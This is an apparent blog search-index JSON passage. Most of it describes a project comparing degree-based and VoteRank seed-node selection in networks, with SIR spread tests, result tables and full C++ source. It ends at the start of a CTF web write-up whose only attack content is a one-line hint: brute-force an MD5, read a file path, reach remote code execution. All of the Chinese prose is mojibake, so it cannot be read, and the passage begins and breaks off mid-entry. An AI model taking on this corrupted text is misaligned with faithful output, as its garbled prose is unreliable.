æŸ“è§„æ¨¡æ¥æ¯”è¾ƒä¸¤ç§æŒ–æ˜æ–¹æ¡ˆã€‚ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:1:0","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"2.ç®—æ³•è¯´æ˜ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:2:0","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"2.1. æ ¹æ®åº¦æŒ–æ˜ ç›´è§‚çš„çœ‹ï¼Œè´ªå¿ƒåœ°é€‰å‡ºå‰ num ä¸ªåˆå§‹ä¼ è¾“ç»“ç‚¹ã€‚ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:2:1","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"2.2. Vote RankæŒ–æ˜ é€šè¿‡æŠ•ç¥¨é€‰ä¸¾çš„ç­–ç•¥ï¼Œåœ¨é€‰å‡ºæŸä¸€ä¸ªç»“ç‚¹ä¹‹åï¼Œé™ä½å‘¨å›´ç»“ç‚¹çš„æŠ•ç¥¨èƒ½åŠ›ï¼Œåœ¨ä¸€å®šç¨‹åº¦ä¸Šé¿å…é€‰å‡ºçš„åˆå§‹èŠ‚ç‚¹å‡ºç°æ‰å †çš„æƒ…å†µã€‚ä»è€Œå°½å¯èƒ½åœ°åˆ†æ•£åˆå§‹èŠ‚ç‚¹ï¼Œä½¿å¾—ä¼ æ’­çš„å°½å¯èƒ½åœ°å¹¿ã€‚ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:2:2","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"2.3. SIRä¼ æŸ“æ¨¡å‹ ç”¨äºæµ‹è¯•ä¸Šé¢ä¸¤ç§æ–¹æ¡ˆçš„ä¼ æ’­èƒ½åŠ›ã€‚è®¾ç«‹æ„ŸæŸ“ï¼Œæœªæ„ŸæŸ“ï¼Œç—Šæ„ˆä¸‰ç§ç±»åˆ«ã€‚é€šè¿‡åˆå§‹ç»“ç‚¹å¼€å§‹è¿›è¡Œä¼ æ’­ï¼Œç›´åˆ°æ‰€æœ‰ç»“ç‚¹æ„ŸæŸ“æˆ–è€…æ¸…é›¶ç»“æŸï¼Œé€šè¿‡æ¯”è¾ƒæ„ŸæŸ“è¿‡çš„èŠ‚ç‚¹æ•°é‡æ¯”å¯¹ä¸¤ç§åˆå§‹ç»“ç‚¹é€‰å–æ–¹æ¡ˆçš„ä¼ æ’­èƒ½åŠ›ã€‚ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:2:3","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"3.ç®—æ³•åˆ†æä¸è®¾è®¡ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:3:0","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"3.1. æ ¹æ®åº¦æŒ–æ˜ è´ªå¿ƒçš„é€‰æ‹©å‰ num å¤§çš„åº¦çš„ç»“ç‚¹å³å¯ï¼Œè¿™é‡Œä¸å¿…è¿›è¡Œæ’åºç®—æ³•ï¼Œè€Œæ˜¯åˆ©ç”¨ nth_element å‡½æ•°é‡‡ç”¨äº†ç±»ä¼¼äºå¿«é€Ÿæ’åºå•æ¬¡ç§»ä½ partation çš„æ€æƒ³ã€‚ nth_element(a.begin(), a.begin() + num, a.end(), cmp); å…¶ä¸­æ—¶é—´å¤æ‚åº¦ä¸º O(N) ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:3:1","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"3.2. Vote RankæŒ–æ˜ åŸå§‹æ€æƒ³çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š 1.åˆå§‹åŒ–æ¯ä¸ªç»“ç‚¹çš„åˆ†æ•°ä¸º0ï¼ŒæŠ•ç¥¨èƒ½åŠ›ä¸º1 2.éå†å›¾ï¼Œæ¯ä¸ªç»“ç‚¹çš„åˆ†æ•°ä¸ºç›´æ¥ç›¸è¿ç»“ç‚¹çš„æŠ•ç¥¨èƒ½åŠ›ä¹‹å’Œ 3.æ‰¾å‡ºåˆ†æ•°æœ€é«˜çš„ç»“ç‚¹ Pï¼Œå°† P åŠ å…¥åˆå§‹ç»“ç‚¹é€‰é›†ä¸­ 4.ä¿®æ”¹ P çš„åˆ†æ•°å’ŒæŠ•ç¥¨èƒ½åŠ›ä¸º0ï¼Œå‰Šå¼± P ç›´æ¥ç›¸è¿çš„ç»“ç‚¹ï¼Œå¹…åº¦ä¸ºåº¦çš„æœŸæœ›çš„å€’æ•° 5.é‡å¤ 2-4 æ­¥ï¼Œç›´è‡³é€‰å‡º num ä¸ªç»“ç‚¹ è€Œåè€ƒè™‘åˆ°æ¯ä¸€æ¬¡å¯¹é€‰å‡ºç»“ç‚¹å’Œç›¸é‚»ç»“ç‚¹æŠ•ç¥¨èƒ½åŠ›çš„æ”¹å˜ï¼Œåªä¼šå½±å“ P çš„äºŒç¯å’Œä¸‰ç¯ç»“ç‚¹ï¼Œå¹¶ä¸ä¼šå½±å“æ•´ä¸ªå›¾çš„åˆ†æ•°ã€‚æ‰€ä»¥åªéœ€è¦å¯¹äºŒç¯æŠ•ç¥¨èƒ½åŠ›å’Œåˆ†æ•°ï¼Œä¸‰ç¯çš„åˆ†æ•°è¿›è¡Œç›¸åº”çš„ä¿®æ”¹å³å¯ã€‚åŒæ—¶åˆå§‹åˆ†æ•°å¯ä»¥ç›´æ¥ç®€åŒ–ä¸ºæ”¹ç‚¹é‚»æ¥è¡¨çš„å¤§å°ï¼Œè€Œä¸å¿…é‡å¤è®¡ç®—ã€‚ ç®—æ³•è¿‡ç¨‹ä¼˜åŒ–å¦‚ä¸‹ï¼š 1.åˆå§‹åŒ–æ¯ä¸ªç»“ç‚¹çš„åˆ†æ•°ä¸ºè¯¥èŠ‚ç‚¹çš„åº¦ï¼ŒæŠ•ç¥¨èƒ½åŠ›ä¸º1 2.æ‰¾å‡ºåˆ†æ•°æœ€é«˜çš„ç»“ç‚¹ Pï¼Œå°† P åŠ å…¥åˆå§‹ç»“ç‚¹é€‰é›†ä¸­ 3.ä¿®æ”¹ P çš„åˆ†æ•°å’ŒæŠ•ç¥¨èƒ½åŠ›ä¸º0 4.å‰Šå¼± P ç›´æ¥ç›¸è¿çš„ç»“ç‚¹ï¼Œå‰Šå¼±ä¸è¯¥ç»“ç‚¹ç›´æ¥ç›¸è¿çš„ç‚¹çš„åˆ†æ•°ï¼Œå¹…åº¦ä¸ºåº¦çš„æœŸæœ›çš„å€’æ•° 5.é‡å¤ 2-4 æ­¥ï¼Œç›´è‡³é€‰å‡º num ä¸ªç»“ç‚¹ ä»æ•ˆæœæ¥çœ‹ï¼ŒVote Rank ç®—æ³•é¿å…äº†å¤§é‡åº¦å€¼æ¯”è¾ƒå¤§çš„ç»“ç‚¹æ‰å †çš„æƒ…å†µï¼Œè€Œæ˜¯å°½é‡åœ°ä½¿é€‰å–çš„ç»“ç‚¹å°½å¯èƒ½åˆ†å¸ƒåœ°å¹¿ï¼Œä»è€Œä½¿å¾—ä¼ æ’­èŒƒå›´æ‰©å¤§ã€‚ ç„¶åè‹¥æ‰€æœ‰ç»“ç‚¹çš„æŠ•ç¥¨èƒ½åŠ›éƒ½ä¸‹é™ä¸º 0 ä¼šå¯¼è‡´é€‰ä¸å‡ºåˆ†æ•°æœ€å¤§çš„ç»“ç‚¹ï¼Œå› æ­¤å½“æ¯æ¬¡é€‰å‡ºçš„æœ€å¤§åˆ†æ•°ç»“ç‚¹çš„åˆ†æ•°ä¸º 0 æ—¶ï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªæœªåŠ å…¥è¿‡çš„ç»“ç‚¹ä½œä¸ºåˆå§‹ç»“ç‚¹ã€‚ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:3:2","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"3.3. SIR ä¼ æ’­æ¨¡å‹ é€šè¿‡è®¾ç½®ç»“ç‚¹ä¸º S, I ,R ä¸‰ç§ç±»åˆ«ï¼Œå…¶ä¸­ S è¡¨ç¤ºå·²ä¼ æŸ“çš„ç»“ç‚¹ï¼Œåœ¨æ¯ä¸€è½®ä¼ æŸ“ä¸­ï¼Œéƒ½æœ‰ beta çš„æ¦‚ç‡ä¼ æŸ“å’Œå®ƒç›´æ¥ç›¸è¿çš„ I ç±»å‹ç»“ç‚¹ï¼Œç„¶åè¯¥ S ç»“ç‚¹å˜ä¸º R ç±»å‹çš„å·²ç—Šæ„ˆç»“ç‚¹ã€‚ ç®—æ³•è¿‡ç¨‹å¦‚ä¸‹ï¼š 1.å°†åˆå§‹ä¼ æ’­ç»“ç‚¹å…¥é˜Ÿåˆ— 2.å–é˜Ÿé¦–ç»“ç‚¹å¼¹å‡ºå¹¶è®¾ä¸º R ç±»å‹ç»“ç‚¹ 3.éå†ä¸å®ƒç›´æ¥ç›¸è¿çš„ I ç±»å‹ç»“ç‚¹ï¼Œæ¯ä¸€ä¸ªä»¥ beta çš„æ¦‚ç‡è¢«ä¼ æŸ“ä¸º S 4.ç¬¬ä¸‰æ­¥ä¸­è¢«ä¼ æŸ“çš„ç»“ç‚¹åŠ å…¥é˜Ÿåˆ—ä¸­ 5.é‡å¤ 2-4 æ­¥ç›´è‡³é˜Ÿåˆ—ä¸ºç©ºï¼Œç»Ÿè®¡æ‰€æœ‰è¢«ä¼ æŸ“è¿‡çš„ç»“ç‚¹çš„æ•°é‡ï¼Œå³è§„æ¨¡ è¯¥ç®—æ³•è¾ƒä¸ºç®€åŒ–çš„æ¨¡æ‹Ÿäº†ç»“ç‚¹çš„ä¼ æ’­è¿‡ç¨‹ï¼Œå¯ä»¥ä½œä¸ºä¸¤ç§æŒ–æ˜æ–¹å¼çš„ä¸€ç§è¯„æµ‹æ‰‹æ®µã€‚ å…¶ä¸­ï¼Œç›´è§‚ä¸Šæ¥çœ‹ï¼ŒVote Rank ç®—æ³•æ˜¯å¯¹åº¦ç®—æ³•çš„ä¼˜åŒ–ç‰ˆæœ¬ï¼Œé€‰å‡ºçš„ç»“ç‚¹åˆ†å¸ƒæ›´ä¸ºå¹¿æ³›ï¼Œç†åº”å¯¹ä¼ æ’­è§„æ¨¡æœ‰ä¸€å®šæ˜¾å¼ç¨‹åº¦çš„æå‡ã€‚ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:3:3","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"4.æµ‹è¯•åˆ†æä¸ç»“æœ æµ‹è¯•ç”¨ä¾‹ä¸º USAir.txt router.txt sex.txt network.txt ç‚¹æ•° 332 5022 16730 36692 è¾¹æ•° 2126 6258 50632 367662 å…·ä½“å†…å®¹è§ ## 6.é™„å½•ä¸æºä»£ç  ï¼Œä»¥åŠé™„å½•æ–‡ä»¶ æµ‹è¯•æ—¶ï¼Œé€‰æ‹©ä¸åŒçš„æ„ŸæŸ“ç‡ beta å’Œä¸åŒçš„åˆå§‹ä¼ æ’­ç»“ç‚¹æ•° numï¼Œç„¶åè¿è¡Œ 500 æ¬¡å–å¹³å‡å€¼ï¼Œè®¡ç®— Vote Rankçš„æå‡å¹…åº¦ é¦–å…ˆæ˜¯åœ¨é€‰å–åˆå§‹ä¼ æ’­ç»“ç‚¹æ•°ä¸åŒæƒ…å†µä¸‹ï¼Œæå‡å¹…åº¦çš„æ•°æ®è¡¨ å…¶ä¸­ beta è®¾ç½®ä¸º 5*averageK/averageK2ï¼šäº”å€åº¦çš„æœŸæœ›é™¤ä»¥åº¦çš„å¹³æ–¹çš„æœŸæœ› æ•°æ®æ–‡ä»¶å 0.01 0.1 0.2 0.3 0.5 0.7 USAir.txt -0.01% 5.24% 11.95% 15.39% 7.73% 2.71% router.txt 1.70% 7.20% 6.18% 4.29% 1.27% 0.35% sex.txt 3.54% 12.51% 14.19% 13.10% 5.32% 2.64% network.txt 4.79% 16.22% 12.89% 9.95% 3.40% 1.61% ç„¶ååœ¨ç¡®å®šåˆå§‹ä¼ æ’­ç»“ç‚¹æ•°ä¸ºæ€»ç»“ç‚¹æ•°çš„ 0.2 æƒ…å†µä¸‹ï¼Œæ”¹å˜ beta å‰é¢çš„ç³»æ•°çš„æ•°æ®è¡¨ æ•°æ®æ–‡ä»¶å 0.1 1.2 2.0 3.0 5.0 10.0 USAir.txt 1.62% 12.57% 15.60% 14.78% 12.72% 5.84% router.txt 0.58% 4.36% 5.60% 6.31% 6.27% 2.97% sex.txt 0.72% 6.64% 9.37% 11.82% 14.01% 13.67% network.txt 0.40% 4.38% 6.74% 9.21% 12.89% 17.08% ç”±äºç›¸å¯¹å›¾ç»“æ„çš„æ„ŸæŸ“ç‡æ°´å¹³å—ç¨€ç–ç¨ å¯†å›¾å½±å“è¾ƒå¤§ï¼Œä»¥ä¸‹ä¸º 0.2 é€‰å–ç‡ä¸‹ä¸åŒç»å¯¹æ„ŸæŸ“ç‡çš„æ•°æ®è¡¨ æ•°æ®æ–‡ä»¶å 0.001 0.01 0.1 0.3 0.5 0.8 USAir.txt 0.80% 6.02% 13.01% 4.24% 2.05% 0.48% router.txt 0.07% 0.73% 4.68% 6.49% 5.32% 2.23% sex.txt 0.39% 3.35% 14.57% 10.80% 6.11% 2.46% network.txt 1.10% 8.78% 15.638% 6.90% 4.84% 4.06% ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:4:0","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"5.åˆ†æä¸ç ”è®¨ ä»æµ‹è¯•ç»“æœä¸­æˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œå½“åˆå§‹ä¼ æ’­èŠ‚ç‚¹æ•°ç›®å¢åŠ æ—¶ï¼Œä¼ æ’­è§„æ¨¡çš„æå‡åº¦å…ˆä¸Šå‡å†ä¸‹é™ã€‚å½“æ„ŸæŸ“ç‡å¢åŠ æ—¶ï¼Œæå‡åº¦åŒæ ·å…ˆä¸Šå‡å†ä¸‹é™ã€‚ è¿™æ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œå½“ä¼ æ’­ç»“ç‚¹è¾ƒå°‘æ—¶ï¼Œä¸¤ç§æ–¹æ¡ˆéƒ½æ˜¯ä¼˜å…ˆé€‰å–ç»“ç‚¹è¾ƒä¸ºå¤§çš„ç‚¹é›†ï¼Œå¹¶æ²¡æœ‰å¤šå°‘å·®åˆ«ã€‚å½“åˆå§‹ä¼ æ’­èŠ‚ç‚¹æ•°é‡å¢åŠ æ—¶ï¼Œåˆå§‹ç»“ç‚¹å·®åˆ«å˜å¤§ï¼Œä¼ æ’­è§„æ¨¡æå‡åº¦å¢åŠ ã€‚ä½†æ˜¯å½“åˆå§‹ä¼ æ’­ç»“ç‚¹æ•°ç›®å¢åŠ åˆ°ä¸€å®šè§„æ¨¡åï¼Œåˆå‡ ä¹é€‰å‡ºäº†å¤§éƒ¨åˆ†ç»“ç‚¹ï¼Œä¸¤ç§æ–¹æ¡ˆå·®åˆ«å˜å°ï¼Œä¼ æ’­è§„æ¨¡æå‡åº¦ä¸‹é™ã€‚ è€Œæ„ŸæŸ“ç‡åŒç†ï¼Œæ„ŸæŸ“ç‡è¾ƒä½ï¼Œä¾‹å¦‚ä¸º 0.001 æ—¶ï¼Œå‡ ä¹ä¼ æ’­ä¸å¼€ï¼Œæå‡å¹…åº¦å¾ˆå°ã€‚æ„ŸæŸ“ç‡å¾ˆå¤§æ¥è¿‘äº 1 æ—¶ï¼Œå‡ ä¹ä¼ éäº†æ•´ä¸ªç½‘ç»œï¼Œæå‡å¹…åº¦ä¾ç„¶å¾ˆå°ã€‚åªæœ‰å½“æ„ŸæŸ“ç‡ä½äºé€‚å½“å¤§å°æ—¶ï¼Œæå‡åº¦æ‰æœ‰ä¸€ä¸ªæ˜¾ç„¶çš„æ°´å¹³ã€‚ åŒæ—¶ï¼Œå›¾çš„ç»“æ„å¯¹æµ‹è¯•ç»“æœå½±å“å¾ˆå¤§ï¼Œä¾èµ–äºç‚¹ä¸ç‚¹ä¹‹é—´çš„åº¦çš„å·®åˆ«ï¼Œç”±äºæµ‹è¯•æ•°æ®ä¸­ router.txt è¾ƒä¸ºç¨€ç–ï¼Œå„ç‚¹çš„åº¦å·®åˆ«è¾ƒå°ï¼Œå¯¼è‡´æå‡ç‡ç›¸æ¯”å…¶ä»–æµ‹è¯•æ•°æ®åå°ã€‚ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:5:0","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"6.æ”¹è¿›æ–¹å‘ 1.æœ¬å®éªŒä¸­å·²ç»å¯¹ Vote Rank ç®—æ³•è¿›è¡Œäº†ä¸€å®šçš„ä¼˜åŒ–ï¼Œå•æ¬¡é€‰ç‚¹ä¹‹ååªæ›´æ–°ä¸€ç¯å’ŒäºŒç¯çš„ç»“ç‚¹ï¼Œä»è€Œé¿å…äº†é‡å¤éå†æ•´ä¸ªå›¾ã€‚ 2.åœ¨æœ¬æ¬¡å®éªŒä¸­ï¼Œä½¿ç”¨äº† vector è¿›è¡Œå­˜å‚¨ï¼Œå¯¼è‡´å›¾çš„éå†çš„æ—¶ï¼Œé¡ºåºæ˜¯å›ºå®šçš„ã€‚åç»­æå‡å¯ä»¥ä½¿ç”¨ undered_map è¿›è¡Œå­˜å‚¨ï¼Œæ¶ˆé™¤æ•°æ®é›†åˆå§‹ç¼–å·çš„å½±å“ã€‚ 3.åœ¨å¯¹å•ç‹¬æ•°æ®æ‰¾åˆ°æœ€é€‚åˆçš„åˆå§‹ä¼ æ’­ç‚¹é›†å’Œæ„ŸæŸ“ç‡å¯ä»¥é‡‡ç”¨æ¨¡æ‹Ÿé€€ç«ç®—æ³•æ‰¾åˆ°è¿‘ä¼¼æœ€ä¼˜è§£ã€‚ ","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:6:0","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["Project"],"content":"7.é™„å½•ä¸æºä»£ç  ä»¥ä¸‹ä¸ºé™„ä»¶ç›®å½•ï¼Œå…·ä½“æ–‡ä»¶å†…å®¹è§é™„ä»¶ $ tree -L 2 . |-- Makefile |-- data | |-- USAir.txt | |-- network.txt | |-- result.out | |-- router.txt | `-- sex.txt |-- output | `-- main.exe `-- src |-- main.cpp `-- main.o 3 directories, 9 files â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-æ‰‹åŠ¨åˆ†å‰²çº¿â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€“ è´´ä¸€ä¸‹æºç å§è¿˜æ˜¯ åŸè°…æˆ‘ä¸åŠ æ³¨é‡Š #include \u003calgorithm\u003e #include \u003cctime\u003e #include \u003ciostream\u003e #include \u003cnumeric\u003e #include \u003cqueue\u003e #include \u003crandom\u003e #include \u003cvector\u003e typedef long long ll; using namespace std; vector\u003cint\u003e Du, Vote; vector\u003cvector\u003cint\u003e \u003e G; void SelectByDu(int num); void SelectByVote(int num); bool cmp(int x, int y); double Rand(); int TestSIR(vector\u003cint\u003e InitNode); double f; int n, m, u, v; int num; /* é€‰å‡ºçš„åˆå§‹ä¼ æ’­ç»“ç‚¹æ•°ç›® */ double pjlunci = 500; /* æ±‚å¹³å‡å€¼çš„è½®æ•° */ vector\u003cint\u003e cntDu, cntVote; double meanDu, meanVote, varianceDu, varianceVote; double averageK, averageK2; double SIRbeta, SIRalpha; struct votenode { double score = 0, value = 1; }; int main(int argc, char *argv[]) { srand(time(NULL)); num = atoi(argv[2]); // SIRalpha = atof(argv[3]); SIRbeta = atof(argv[3]); freopen(argv[1], \"r\", stdin); freopen(\"data\\\\result.out\", \"w\", stdout); cin \u003e\u003e n \u003e\u003e m; cout \u003c\u003c \"[+] vertices : \" \u003c\u003c n \u003c\u003c \" edges : \" \u003c\u003c m \u003c\u003c endl; cout \u003c\u003c \"[+] the num of selected is \" \u003c\u003c num \u003c\u003c endl; G.resize(n); for (int i = 0; i \u003c m; i++) { cin \u003e\u003e u \u003e\u003e v; G[u].push_back(v), G[v].push_back(u); } averageK = 2.0 * m / n; f = 1.0 / averageK; SelectByDu(num); SelectByVote(num); for (auto \u0026i : G) averageK2 += pow(i.size(), 2) / (double)n; // SIRbeta = SIRalpha * (averageK / averageK2); cout \u003c\u003c \"averageK = \" \u003c\u003c averageK \u003c\u003c \" averageK2 =\" \u003c\u003c averageK2 \u003c\u003c \"\\n\" \u003c\u003c endl; cout \u003c\u003c \"SIRbeta = \" \u003c\u003c SIRbeta \u003c\u003c \"\\n\" \u003c\u003c endl; for (int i = 0; i \u003c pjlunci; i++) { cntDu.push_back(TestSIR(Du)), cntVote.push_back(TestSIR(Vote)); } meanDu = accumulate(cntDu.begin(), cntDu.end(), 0.0) / pjlunci; meanVote = accumulate(cntVote.begin(), cntVote.end(), 0.0) / pjlunci; for (int i = 0; i \u003c pjlunci; i++) { varianceDu += pow(cntDu[i] - meanDu, 2) / n; varianceVote += pow(cntVote[i] - meanVote, 2) / n; } cout \u003c\u003c \"[+] the mean of Du: \" \u003c\u003c meanDu \u003c\u003c \" the variance of Du: \" \u003c\u003c varianceDu \u003c\u003c endl; cout \u003c\u003c \"[+] the mean of Vote: \" \u003c\u003c meanVote \u003c\u003c \" the variance of Vote: \" \u003c\u003c varianceVote \u003c\u003c endl; cout \u003c\u003c \"rate : \" \u003c\u003c (meanVote - meanDu) / meanDu * 100 \u003c\u003c \" %\" \u003c\u003c endl; return 0; } bool cmp(int x, int y) { return G[x].size() \u003e G[y].size(); } double Rand() { return (double)rand() / RAND_MAX; } // ä»¥åº¦ä¸ºé¡ºåºé€‰å‡ºå‰ num å¤§çš„èŠ‚ç‚¹ void SelectByDu(int num) { clock_t start, finish; start = clock(); vector\u003cint\u003e a(n); for (int i = 0; i \u003c n; i++) a[i] = i; nth_element(a.begin(), a.begin() + num, a.end(), cmp); cout \u003c\u003c \"[+] Select by degree of vertex\" \u003c\u003c endl; for (int i = 0; i \u003c num; i++) Du.push_back(a[i]); sort(Du.begin(), Du.end(), cmp); // for (int i = 0; i \u003c num; i++) { // cout \u003c\u003c Du[i] \u003c\u003c \" \"; // } finish = clock(); cout \u003c\u003c endl \u003c\u003c \"[-] the time cost is:\" \u003c\u003c double(finish - start) / CLOCKS_PER_SEC \u003c\u003c endl \u003c\u003c endl; } void SelectByVote(int num) { clock_t start, finish; start = clock(); vector\u003cvotenode\u003e S(n); vector\u003cint\u003e vis(n); for (int i = 0; i \u003c n; i++) { S[i].score = G[i].size(), S[i].value = (double)1; } while (num--) { double maxScore = -1; int p = -1; for (int i = 0; i \u003c n; i++) { if (S[i].score \u003e maxScore) { maxScore = S[i].score; p = i; } } if (maxScore == 0) { for (int i = 0; i \u003c n; i++) { if (!vis[i]) { p = i; break; } } } vis[p] = 1; for (int i = 0; i \u003c (int)G[p].size(); i++) { u = G[p][i]; S[u].score -= S[p].value; double deltaval = S[u].value - max(S[u].value - f, (double)0); S[u].value = max(S[u].value - f, (double)0); for (int j = 0; j \u003c (int)G[u].size(); j++) { v = G[u][j]; S[v].score = max(S[v].score - deltaval, (double)0); } } S[p].score = S[p].value = 0; Vote.push_back(p); } cout \u003c\u003c \"[+] Select by vote of vertex\" \u003c\u003c endl; // for (int i = 0; i \u003c (int)Vote.size(); i++) { // cout \u003c\u003c Vote[i] \u003c\u003c \" \"; // } finish = clock(); cout \u003c\u003c endl \u003c\u003c \"[-] the time cost is:\" \u003c\u003c double(finish - start) / CLOCKS_PER_SEC \u003c\u003c endl \u003c\u003c endl; } int TestSIR(vector\u003cint\u003e Init","date":"2022-12-20","objectID":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/:7:0","tags":["Project"],"title":"RankVote_é‡è¦èŠ‚ç‚¹ç»„æŒ–æ˜","uri":"/rankvote_%E9%87%8D%E8%A6%81%E8%8A%82%E7%82%B9%E7%BB%84%E6%8C%96%E6%8E%98/"},{"categories":["CTF"],"content":"æ‘˜è¦ï¼šå››å·ç½‘å®‰çœèµ›2022","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/","tags":["CTF","WEB","Writeup"],"title":"å››å·çœç½‘å®‰æŠ€èƒ½å¤§èµ›2022-å¤ç°å­¦ä¹ ","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"\r","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/:0:0","tags":["CTF","WEB","Writeup"],"title":"å››å·çœç½‘å®‰æŠ€èƒ½å¤§èµ›2022-å¤ç°å­¦ä¹ ","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"[WEB] requests ç­¾åˆ°é¢˜ï¼Œçˆ†ç ´ä¸€ä¸‹ md5 ç„¶åè¯»å–æ–‡ä»¶è·¯å¾„ rce å°±è¡Œ ","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/:1:0","tags":["CTF","WEB","Writeup"],"title":"å››å·çœç½‘å®‰æŠ€èƒ½å¤§èµ›2022-å¤ç°å­¦ä¹ 